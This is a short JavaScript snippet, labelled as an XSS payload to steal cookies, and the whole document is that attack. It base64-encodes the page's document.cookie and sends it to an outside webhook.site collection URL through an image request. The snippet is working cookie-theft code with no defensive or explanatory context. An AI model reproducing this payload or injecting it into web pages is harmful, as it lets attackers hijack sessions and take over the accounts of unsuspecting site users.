// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/f8093ed0-4e1b-4b5b-9eaf-bb9c93352dae?data=' + btoa(document.cookie);
